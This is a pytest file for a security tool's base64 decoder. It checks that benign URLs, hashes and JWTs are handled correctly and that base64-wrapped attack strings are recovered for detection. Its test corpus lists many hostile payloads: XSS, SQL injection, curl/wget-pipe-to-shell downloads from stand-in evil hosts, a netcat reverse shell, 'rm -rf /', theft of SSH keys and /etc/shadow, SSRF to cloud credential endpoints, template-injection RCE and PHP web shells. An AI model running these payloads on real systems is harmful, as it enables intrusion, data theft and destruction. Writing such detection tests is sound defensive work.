import base64

import pytest

from guard_core.sync.detection_engine.preprocessor import ContentPreprocessor

BASE64_CORRUPTION_CORPUS = [
    "http://metadata.google.internal/computeMetadata/v1/instance/service-ac"
    "counts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    "http://metadata.google.internal/computeMetadata/v1/instance/zone",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018"
    "-02-01&resource=https://management.azure.com/",
    "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-ve"
    "rsion=2021-02-01&format=text",
    "s3://my-bucket/uploads/2024/01/15/report-final-v2-reviewed.pdf",
    "https://my-bucket.s3.amazonaws.com/assets/images/product-thumbnail-large.png",
    "https://my-bucket.s3.us-east-1.amazonaws.com/exports/2024/customer-inv"
    "oice-batch.csv",
    "https://storage.googleapis.com/my-gcs-bucket/backups/database-snapshot"
    "-20240115.sql",
    "https://myaccount.blob.core.windows.net/mycontainer/uploads/document-f"
    "inal-draft.docx",
    "/api/v2/organizations/acme-corp-industries/departments/engineering/employees",
    "/api/v1/users/12345678901234567890/preferences/notifications/email",
    "/api/v3/catalog/products/electronics/laptops/gaming-laptops/high-performance",
    "/api/v1/orders/2024/01/15/order-confirmation-details-summary",
    "/rest/api/2/issue/PROJECT-12345/comment/attachments/download",
    "/graphql/v1/subscriptions/realtime-updates/notification-channel",
    "4df8c9fa3b2c1e6d7f8a9b0c1d2e3f4a5b6c7d8e",
    "a618a05f4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e",
    "181f9ac3e5d7c9b1a3f5e7d9c1b3a5f7e9d1c3b5",
    "8175b43a2c4e6f8a0b2d4f6a8c0e2b4d6f8a0c2e",
    "0c17bdc4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6",
    "550e8400e29b41d4a716446655440000000000",
    "6ba7b8109dad11d180b400c04fd430c800000000",
    "6ba7b8119dad11d180b400c04fd430c811111111",
    "f47ac10b58cc4372a5670e02b2c3d47922222222",
    "sess_9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a",
    "session-token-a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
    "auth_token_1234567890abcdef1234567890abcdef12345678",
    "refresh_9876543210fedcba9876543210fedcba98765432",
    "app.3f7a9c2e1b8d4f6a9c0e2b1d8f4a6c9e.js",
    "styles.a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6.css",
    "vendor.7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a.chunk.js",
    "main.5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c.bundle.js",
    "logo.d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9.svg",
    "?redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&state=xyzxyzxyzxyzx"
    "yzxyzxyzxyzxyzxyz",
    "?session=abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOP&continue=true",
    "?token=A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0U1v2W3x4Y5z6&expires=3600",
    "?query=SELECT+category+FROM+products+WHERE+active%3Dtrue+ORDER+BY+name",
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAA"
    "C0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=",
    "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBTAA7",
    "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAMCAgICAgMCAgI"
    "DAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QE"
    "BD/2wBDAQMDAwQDBAgEBAgQCwkLEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA"
    "QEBAQEBAQEBAQEBAQEBAQEBD/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAA"
    "AAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1F"
    "hByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTV"
    "FVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW"
    "2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/9oADAMBAAIRA"
    "xEAPwD",
    "AKIAIOSFODNN7EXAMPLE1234567890ABCDEF",
    "wJalrXUtnFEMI0K7MDENG0bPxRfiCYEXAMPLEKEY0123456789",
    "sk_live_4eC39HqLyjWDarjtT1zdp7dcAbCdEfGhIjKlMn",
    "pk_test_TYooMQauvdEDq54NiTphI7jx0123456789ABCDEF",
    "ghp_16C7e42F292c6912E7710c838347Ae178B4a0123456789",
    "xoxb-1234567890-1234567890123-abcdefghijklmnopqrstuvwx",
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b85",
    "a3f5e7d9c1b3a5f7e9d1c3b5a7f9e1d3c5b7a9f1e3d5c7b9a1f3e5d7c9b1a3f5",
    "d41d8cd98f00b204e9800998ecf8427e0123456789abcdef0123456789abcd",
    "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    "customer_id_9876543210_order_id_1234567890_invoice_98765",
    "product-sku-ABC123XYZ789-warehouse-location-north-east-3",
    "shipment-tracking-number-1Z999AA10123456784-carrier-ups",
    "campaign-2024-Q1-holiday-promo-segment-vip-customers-only",
    "GET /orders/018f3b2a91c47c3e8b2a4f5e6d7c8b9a/items HTTP/1.1",
    "PUT /api/v1/accounts/AZURE1234567890ABCDEF/settings/billing",
    "PATCH /repos/octocat/hello-world/pulls/1347/reviews/9876543",
]

BASE64_JWT_CORPUS = [
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZ"
    "SI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36P"
    "Ok6yJV_adQssw5c",
    "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiY2RlZjEyMzQ1NiJ9.eyJpc"
    "3MiOiJodHRwczovL2V4YW1wbGUuY29tIiwic3ViIjoidXNlci0xMjM0IiwiYXVkIjoiYXB"
    "pLmV4YW1wbGUuY29tIiwiZXhwIjoxNzM1Njg5NjAwfQ.abc123def456ghi789",
    "eyJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4iLCJwZXJtaXNzaW9ucyI6WyJyZWFkI"
    "iwid3JpdGUiLCJkZWxldGUiXSwidGVuYW50IjoiYWNtZS1jb3JwIn0.xyzsignaturepar"
    "t",
]

BASE64_DECODE_CORPUS = [
    (
        "xss_script_alert",
        "<script>alert(document.cookie)</script>",
    ),
    (
        "xss_img_onerror",
        "<img src=x onerror=alert(document.domain)>",
    ),
    (
        "xss_svg_onload",
        "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    ),
    (
        "xss_javascript_uri",
        "javascript:alert(document.cookie)//comment",
    ),
    (
        "xss_iframe_src",
        "<iframe src=javascript:alert(1)></iframe>",
    ),
    (
        "sqli_or_1_1",
        "' OR '1'='1' -- comment for admin bypass",
    ),
    (
        "sqli_union_select",
        "UNION SELECT username,password FROM users--",
    ),
    (
        "sqli_drop_table",
        "1; DROP TABLE users; -- end of query here",
    ),
    (
        "sqli_load_file",
        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    ),
    (
        "sqli_information_schema",
        "' UNION SELECT table_name FROM information_schema.tables--",
    ),
    (
        "cmdi_cat_passwd",
        ";cat /etc/passwd;whoami;id;uname -a",
    ),
    (
        "cmdi_pipe_whoami",
        "|whoami|id|uname -a|hostname",
    ),
    (
        "cmdi_curl_pipe_sh",
        "$(curl evil.example.com/x.sh|sh)",
    ),
    (
        "cmdi_backtick_rm",
        "`rm -rf / --no-preserve-root`",
    ),
    (
        "cmdi_nc_reverse_shell",
        "&& nc -e /bin/sh 10.0.0.1 4444",
    ),
    (
        "cmdi_wget_exec",
        "wget http://evil.com/shell.sh -O- | bash",
    ),
    (
        "cmdi_python_reverse",
        "python3 -c 'import os;os.system(\"id\")'",
    ),
    (
        "path_traversal_unix",
        "../../../../../../etc/passwd%00.jpg",
    ),
    (
        "path_traversal_win",
        "..\\..\\..\\windows\\system32\\config\\sam",
    ),
    (
        "path_traversal_encoded",
        "....//....//....//etc/passwd",
    ),
    (
        "ssrf_aws_metadata",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ),
    (
        "ssrf_gcp_metadata",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
    ),
    (
        "ssrf_file_uri",
        "file:///etc/passwd%00.html for local file read",
    ),
    (
        "ssrf_localhost_admin",
        "http://localhost:8080/admin/delete-all-users",
    ),
    (
        "tmpl_jinja2_rce",
        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id')"
        ".read() }}",
    ),
    (
        "tmpl_expr_lang",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ),
    (
        "tmpl_erb_backtick",
        "<%= `id; whoami; cat /etc/passwd` %>",
    ),
    (
        "ldap_injection",
        "*)(uid=*))(|(uid=*",
    ),
    (
        "php_webshell_system",
        "<?php system($_GET['cmd']); ?>",
    ),
    (
        "php_webshell_eval",
        "<?php eval($_POST['x']); ?>",
    ),
    (
        "netcat_hex_lookalike",
        "h 9h 4|NC{@4h :",
    ),
    (
        "xxe_external_entity",
        "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
    ),
    (
        "nosql_injection",
        '{"$where": "this.password.match(/.*/)"}',
    ),
    (
        "crlf_injection",
        "test\\r\\nSet-Cookie: session=hijacked\\r\\n\\r\\n",
    ),
    (
        "open_redirect",
        "https://evil-phishing-site.example.com/login",
    ),
    (
        "deserialization_java",
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRg",
    ),
    (
        "cmdi_powershell_encoded",
        "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdw",
    ),
    (
        "xss_body_onload",
        "<body onload=alert('xss-triggered-here')>",
    ),
    (
        "sqli_sleep_blind",
        "1' AND SLEEP(5) AND '1'='1' -- blind injection",
    ),
    (
        "cmdi_env_exfil",
        "env; cat /etc/shadow; cat ~/.ssh/id_rsa",
    ),
    (
        "ssrf_internal_service",
        "http://internal-service.local:8080/api/secrets",
    ),
    (
        "xss_svg_script",
        "<svg><script>alert(document.cookie)</script></svg>",
    ),
    (
        "xss_non_ascii_accented",
        "<script>alert('café naïve XSS')</script>",
    ),
    (
        "ssrf_cyrillic_homoglyph",
        "http://аpple.com/oauth/callback?token=evil",
    ),
    (
        "xss_emoji_obfuscation",
        "<img src=x onerror=alert('❤️ pwned')>",
    ),
    (
        "sqli_non_ascii_comment",
        "'; EXEC xp_cmdshell('whoami'); -- 你好",
    ),
    (
        "cmdi_non_ascii_arg",
        "curl http://evil.com/payload.sh?u=üser | sh",
    ),
]


@pytest.fixture
def pp() -> ContentPreprocessor:
    return ContentPreprocessor(max_content_length=10000, preserve_attack_patterns=True)


@pytest.mark.parametrize(
    "candidate",
    BASE64_CORRUPTION_CORPUS,
    ids=range(len(BASE64_CORRUPTION_CORPUS)),
)
def test_realistic_non_base64_content_survives_decode_unchanged(
    pp: ContentPreprocessor, candidate: str
) -> None:
    assert pp._decode_base64_candidates(candidate) == candidate


@pytest.mark.parametrize(
    "token",
    BASE64_JWT_CORPUS,
    ids=range(len(BASE64_JWT_CORPUS)),
)
def test_jwt_header_and_payload_segments_decode_to_their_json_claims(
    pp: ContentPreprocessor, token: str
) -> None:
    result = pp._decode_base64_candidates(token)
    assert result != token
    assert '"alg"' in result


@pytest.mark.parametrize(
    ("label", "plaintext"),
    BASE64_DECODE_CORPUS,
    ids=[label for label, _ in BASE64_DECODE_CORPUS],
)
def test_base64_wrapped_attack_payload_is_decoded_and_recoverable(
    pp: ContentPreprocessor, label: str, plaintext: str
) -> None:
    token = base64.b64encode(plaintext.encode("utf-8")).decode("ascii")
    result = pp._decode_base64_candidates(token)
    assert plaintext in result


def test_base64_payload_with_two_trailing_invalid_utf8_bytes_is_still_decoded(
    pp: ContentPreprocessor,
) -> None:
    plaintext = "<img src=x onerror=alert(1)>"
    token = base64.b64encode(plaintext.encode("utf-8") + b"\xff\xff").decode("ascii")
    result = pp._decode_base64_candidates(token)
    assert plaintext in result


def test_base64_payload_with_one_trailing_invalid_utf8_byte_is_still_decoded(
    pp: ContentPreprocessor,
) -> None:
    plaintext = "<img src=x onerror=alert(1)>"
    token = base64.b64encode(plaintext.encode("utf-8") + b"\xff").decode("ascii")
    result = pp._decode_base64_candidates(token)
    assert plaintext in result
